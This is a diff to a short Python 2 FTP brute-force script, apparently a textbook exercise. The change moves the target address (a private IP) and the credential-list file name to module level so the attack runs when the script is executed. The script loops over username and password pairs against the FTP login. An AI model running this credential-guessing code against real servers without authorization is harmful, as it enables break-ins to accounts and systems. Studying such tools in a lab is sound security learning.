@@ -1,9 +1,11 @@
+#!/usr/bin/env python
 import ftplib
+host = '192.168.95.179'
+passwdFile = 'userpass.txt'
 
 def banner():
 	print "########    BruteLogin p 58   ########"
 	print "bruteLogin.py"
-
 
 def bruteLogin(hostname, passwdFile):
 	pF = open(passwdFile, 'r')
@@ -21,6 +23,5 @@ def bruteLogin(hostname, passwdFile):
 			pass
 	print '\n[-] Could not brute force FTP credentials.'
 	return (None, None)
-	host = '192.168.95.179'
-	passwdFile = 'userpass.txt'
-	bruteLogin(host, passwdFile)
+
+bruteLogin(host, passwdFile)
